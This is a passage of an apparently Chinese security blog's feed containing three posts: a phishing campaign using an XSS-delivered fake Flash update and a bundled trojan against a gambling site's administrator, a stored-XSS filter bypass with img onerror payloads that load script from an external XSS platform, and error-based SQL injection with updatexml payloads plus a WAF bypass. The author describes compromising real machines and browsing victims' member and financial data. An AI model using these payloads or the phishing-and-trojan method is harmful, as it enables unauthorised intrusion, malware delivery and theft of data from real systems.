alt="6"></p><h1 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h1><p>既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：<a href="https://github.com/r00tSe7en/Fake-flash.cn">传送门</a>。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>一个免费空间，一个免费域名（域名可以搞一个 <a href="http://www.flashxxx.tk/">www.flashxxx.tk</a> 这种的，可信度比较高），一个可以正常上线的马子。</p><p>然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/7.png" alt="7"></p><h2 id="关于马子"><a href="#关于马子" class="headerlink" title="关于马子"></a>关于马子</h2><p>可以做到运行正常安装文件的同时运行马子，骚姿势：<a href="https://www.baikesec.com/webstudy/still/77.html">自解压捆绑文件的利用</a></p><p>为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。</p><h2 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h2><p>由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/8.png" alt="8"></p><h2 id="一切就绪"><a href="#一切就绪" class="headerlink" title="一切就绪"></a>一切就绪</h2><p>万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/9.png" alt="9"></p><p>页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页）</p><p>不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。</p><h2 id="成功上线："><a href="#成功上线：" class="headerlink" title="成功上线："></a>成功上线：</h2><p>这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/10.png" alt="10"></p><p>看一会对面在干哈：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/11.png" alt="11"></p><p>这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/12.png" alt="12"></p><p>打开了一个账面，这流水咱也看不懂：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/13.png" alt="13"></p><p>再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/14.png" alt="14"></p><p>F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/15.png" alt="15"></p><h1 id="点到为止："><a href="#点到为止：" class="headerlink" title="点到为止："></a>点到为止：</h1><p>不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/16.png" alt="16"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;要保持学习的好习惯，这次平时学的就用上了。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一处图片引用功能导致的XSS</title>
    <link href="https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/"/>
    <id>https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/</id>
    <published>2019-12-04T15:10:24.000Z</published>
    <updated>2020-11-14T19:58:50.676Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。</p></blockquote><a id="more"></a><h1 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h1><p><font color=#FF0000 >漏洞点：站点产品评论处</font></p><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt;</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/1.png" alt="1"></p><p>因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。</p><p>查看编辑器的其他功能：</p><p>图片上传：<br>可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。<br>可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。</p><p>表情功能：没什么可利用的。</p><h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><p>当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.png" alt="2"></p><h2 id="正常测试"><a href="#正常测试" class="headerlink" title="正常测试"></a>正常测试</h2><p>先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|XSSURL|xxxxx Logo]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/3.png" alt="3"></p><h2 id="带入payload"><a href="#带入payload" class="headerlink" title="带入payload"></a>带入payload</h2><p>把xss payload 放在链接的位置再看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规的payload：</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br><span class="line">构造的payload：</span><br><span class="line">[img|x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|xxxxx Logo]</span><br></pre></td></tr></table></figure><p>提交后审查元素发现为如下显示：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/4.png" alt="4"></p><h2 id="尝试闭合"><a href="#尝试闭合" class="headerlink" title="尝试闭合"></a>尝试闭合</h2><p>尝试闭合 x 处的双引号，让 onerror 逃逸出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|hello] </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/5.png" alt="5"></p><p>这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。</p><h2 id="闭合成功"><a href="#闭合成功" class="headerlink" title="闭合成功"></a>闭合成功</h2><p>直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/6.png" alt="6"></p><p>换个思路通过闭合掉 ; 后面的双引号，显示效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&quot;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/7.png" alt="7"></p><p>最终在没有任何错误内容显示的情况下成功执行了xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/8.png" alt="8"></p><p>看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。</p><h1 id="灵活运用"><a href="#灵活运用" class="headerlink" title="灵活运用"></a>灵活运用</h1><p>这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。</p><p>本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.1.jpg" alt="2.1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p>这里直接把payload放进去，看下前端显示</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.2.jpg" alt="2.2"></p><p>同样的思路，这里直接闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror&#x3D;&quot;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.3.jpg" alt="2.3"></p><p>成功加载payload</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.4.jpg" alt="2.4"></p><p>平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|Bypass安全狗</title>
    <link href="https://www.se7ensec.cn/2019/11/11/BC%E5%AE%9E%E6%88%98Bypass%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <id>https://www.se7ensec.cn/2019/11/11/BC%E5%AE%9E%E6%88%98Bypass%E5%AE%89%E5%85%A8%E7%8B%97/</id>
    <published>2019-11-11T03:10:24.000Z</published>
    <updated>2020-11-14T19:57:40.270Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学以致用。</p></blockquote><a id="more"></a><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>常规流程走一遍，发现一处标记信息已读的功能点比较可疑：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/1.png" alt="1"></p><p>抓包加单引号重放：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/2.png" alt="2"></p><p>可以看到单引号被转义了，看下闭合方式，问题不大，因为有回显，直接使用报错注入。</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="获取下数据库用户"><a href="#获取下数据库用户" class="headerlink" title="获取下数据库用户"></a>获取下数据库用户</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127) or updatexml(1,concat(0x3a,user()),1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/3.png" alt="3"></p><h2 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127) or updatexml(1,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (schema_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/4.png" alt="4"></p><h2 id="Bypass安全狗"><a href="#Bypass安全狗" class="headerlink" title="Bypass安全狗"></a>Bypass安全狗</h2><p>掏出前段时间学到的打狗棒法（超长字符Bypass，这里类型不同，原理相同）：<a href="https://mp.weixin.qq.com/s/1cxlGvNWXmzkmyczXJMtvw">传送门</a></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/5.png" alt="5"></p><p>后面的和常规报错没什么不同，就不啰嗦了，领会精神~</p><h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><p>渗透测试中习惯以开发者的角度考虑一个功能的实现，会更快的找到有效的切入点。</p><p>结合<code>BurpSuite</code>的<code>Intruder</code>模块中的<code>Grep-Match </code>功能使用，可以快速提取报错注入的结果。</p><p>超长字符不仅仅可以应用在Bypass安全狗注入，利用参数污染，XSS也是可以滴。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;学以致用。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="SQL注入" scheme="https://www.se7ensec.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
